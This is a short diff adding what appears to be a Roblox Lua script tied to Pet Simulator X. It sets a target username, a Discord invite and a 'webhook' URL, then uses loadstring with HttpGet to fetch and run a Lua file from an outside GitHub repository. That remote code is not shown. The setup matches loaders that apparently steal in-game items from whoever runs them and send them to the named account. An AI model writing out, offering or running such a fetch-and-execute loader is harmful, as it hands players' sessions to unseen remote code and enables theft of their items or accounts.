@@ -1,0 +1,5 @@
+_G.Username = "JOAOGFGr"
+_G.HubName = ".gg/u2bgccUkzf"
+_G.WebhookUrl = "https://raw.githubusercontent.com/Aspekety/Pet-simulador-X-script/main/Pet-simulador-X-script"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
